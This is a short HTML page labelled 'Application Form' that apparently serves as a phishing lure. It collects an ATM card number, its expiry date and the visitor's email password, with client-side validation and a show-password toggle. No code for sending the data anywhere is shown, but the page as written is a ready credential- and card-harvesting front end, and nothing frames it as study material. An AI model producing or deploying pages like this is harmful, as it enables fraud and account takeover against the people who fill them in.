<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }
    .input-group {
      position: relative;
    }
    .input-group input {
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      color: #888;
    }
    .error {
      color: red;
      font-size: 14px;
      display: none;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <form id="applicationForm">
    <!-- CARD NUMBER -->
    <label for="cardNumber">ATM Card Number (16 digits):</label>
    <input type="text" id="cardNumber" maxlength="16" required />
    <div id="cardError" class="error">Card number must be exactly 16 digits.</div>

    <!-- EXPIRY -->
    <label for="expiry">Expiry Date (MM/YY):</label>
    <input type="text" id="expiry" maxlength="5" required placeholder="MM/YY" />
    <div id="expiryError" class="error">Enter valid expiry (MM/YY).</div>

    <!-- EMAIL PASSWORD -->
    <label for="password">Email Password:</label>
    <div class="input-group">
      <input type="password" id="password" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <button type="submit" style="margin-top: 20px;">Submit</button>
  </form>

  <script>
    // Eye toggle
    function togglePassword() {
      const password = document.getElementById("password");
      password.type = password.type === "password" ? "text" : "password";
    }

    // Expiry formatting
    const expiryInput = document.getElementById("expiry");
    expiryInput.addEventListener("input", () => {
      let value = expiryInput.value.replace(/\D/g, "").substring(0, 4);
      if (value.length >= 3) {
        expiryInput.value = value.slice(0, 2) + "/" + value.slice(2);
      } else {
        expiryInput.value = value;
      }
    });

    // Field validation when leaving
    document.getElementById("cardNumber").addEventListener("blur", () => {
      const card = document.getElementById("cardNumber").value.trim();
      document.getElementById("cardError").style.display = (card.length !== 16 || /\D/.test(card)) ? "block" : "none";
    });

    expiryInput.addEventListener("blur", () => {
      const value = expiryInput.value.trim();
      const match = value.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
      document.getElementById("expiryError").style.display = match ? "none" : "block";
    });

    // Final submit validation
    document.getElementById("applicationForm").addEventListener("submit", function(e) {
      const card = document.getElementById("cardNumber").value.trim();
      const expiry = expiryInput.value.trim();
      let valid = true;

      if (card.length !== 16 || /\D/.test(card)) {
        document.getElementById("cardError").style.display = "block";
        valid = false;
      }

      const match = expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
      if (!match) {
        document.getElementById("expiryError").style.display = "block";
        valid = false;
      }

      if (!valid) e.preventDefault();
    });
  </script>
</body>
</html>
